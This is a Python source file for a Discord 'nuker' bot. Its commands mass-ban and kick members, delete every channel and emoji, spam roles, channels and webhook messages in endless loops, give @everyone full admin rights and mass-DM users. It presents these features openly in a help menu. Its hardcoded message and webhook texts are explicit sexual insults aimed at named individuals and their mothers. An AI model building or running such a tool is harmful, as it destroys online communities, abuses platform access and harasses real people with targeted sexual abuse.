import discord,asyncio
from discord.ext import commands
import os
import random 
from discord import Permissions

client = commands.Bot(command_prefix=">", intents = discord.Intents.all())
CHANNEL_NAMES = ["Love from Ankush & Amish(Paracetamol)"]
MESSAGE_CONTENTS = ["@everyone @here rounak teri maa ke gile bhosde se nikle hue hijde tu or tere srvr ki mai ki chut",
"@everyone @here nikhil teri amma lwdi h😃 jo khet m mrwane jaati h mumfail ke tel se or teri bndi mere lund pe apni gand ghisti h aake",
"@everyone @here sherr (Tharki loda) Teri bs taange bhr aayi h tera bheja abhi v teri maa ke bhosde m atka hua h",
"@everyone @here Server chud gya.ab rounak ki mummy ki baari 🤣",
"@everyone @here https://cdn.discordapp.com/attachments/1031120803602903062/1031175506651000862/20221016_173052.jpg",
"@everyone @here https://media.discordapp.net/attachments/1066427117262356543/1066427169573711882/IMG-20230121-WA0037.jpg"]

WEBHOOK_NAMES = ["Love from Ankush & Paracetamol",
"Sher ki ma ki chut me loda",
"Nikhil's mom fucked up",
"Sher mere lode pe",
"Nafisa ki chut me lund",
"Nikhil madharchod",
"Nikhil randi ka bacha",
"Nikhil mere sperm ka",
"Nikhil made with ankush's sperm",
"Nikhil ki mummu randi",
"Rounak mere lode pe",
"Rounak ki gand daily maarta hu mai"
"Lr mere lode pe",
"Nikhil ki ma mere lode pe",
"A",
"B",
"c",
"d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

client.remove_command('help')

                                         
 
@client.command("ban")
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            if member.id != 860039451895005265:
                for user in list(ctx.guild.members):
                    try:
                        await ctx.guild.ban(user)
                        print (f"{user.name} Was Banned")
                    except:
                        pass

@client.command()

async def dm(ctx, *, message:str):

  await ctx.message.delete()

  for user in list(ctx.guild.members):

    try:

      await user.send(message)

      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")

    except:

      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")

@client.command()
async def ping(ctx):
  await ctx.send(f"`{round(client.latency*1000, 2)}ms`")


@client.command(pass_context=True)

async def admin(ctx):

  await ctx.message.delete()

  for role in list(ctx.guild.roles):

             if role.name == '@everyone':

                  try:

                      await role.edit(permissions=Permissions.all())

                      print("@everyone has admin") 

                  except:

                      print("Failed to give everyone admin")

@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "prefix >"))
  print('''Ankush is Ready!''')
@client.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)
@client.command(pass_context=True)
async def emojidel(ctx):
   await ctx.message.delete()
   for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@client.command()
async def roles(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Ankush Here")
      print("Created Roles")
    except:
        print("Failed To Create Role")

  

@client.command("wizz")
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="Ankush On Top Bxby")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been wizzed")
    except:
        pass
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  # await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          webhook = await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))
          await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
          print(f"{channel.name} spammed")
        except:
          pass
          
    for member in ctx.guild.members:
      if member.id != 860039451895005265:  
        try:
          await member.ban(reason="Ankush Here")
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}")
        

@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))

@client.command("kick")
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Ankush Was Here")
      print(member.name + "Has Been Kicked")
    except:
      print(member.name + "Has Not Been Kicked")

@client.command(aliases=["h", "Help"])
async def help(ctx, category=None):
    if category is None:
        embed = discord.Embed(color=0x373A3D)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/969936505797754930/971772278155128832/HELL.gif")
        embed.add_field(name="**Ankush On The Top Bxby**",

                        value=f"**• My Prefix is `>` | Total Commands - ``9``**",
                        inline=False)
        embed.add_field(
            name="__COMMANDS__",
            value=
            f"**\n-> wizz - Nukes The Whole Server\n-> ban - Bans All The Members In The Server\n-> kick - Kicks All The Members in The Server\n-> roles - Start Spamming Role In Server\n-> emojidel - Deletes All Emojis Of The Server\n-> dm - Mass DM Everyone in the Server\n-> 𝗇𝖺𝗆𝖾 - C𝗁𝖺𝗇𝗀𝖾𝗌 Guild Name\n-> 𝖺𝖽𝗆𝗂𝗇 - Set's Admin Perms To Everyone Role\n-> prune - Prune Members in The Server For inactivity of 1 day\n\n`Made By AnkushOP`**",
            inline=True)
        #embed.set_image(url="https://cdn.discordapp.com/attachments/969936505797754930/971772376746434570/standard_21.gif")
        await ctx.reply(embed=embed)

@client.command()
async def prune(ctx):
  await ctx.reply(" Initiating a prune request.")
  await ctx.guild.prune_members(days=1, roles=ctx.guild.roles)
  await ctx.reply("Successfully Pruned Members With 1 Day Of Inactivity")  

client.run(os.getenv("TOKEN"))
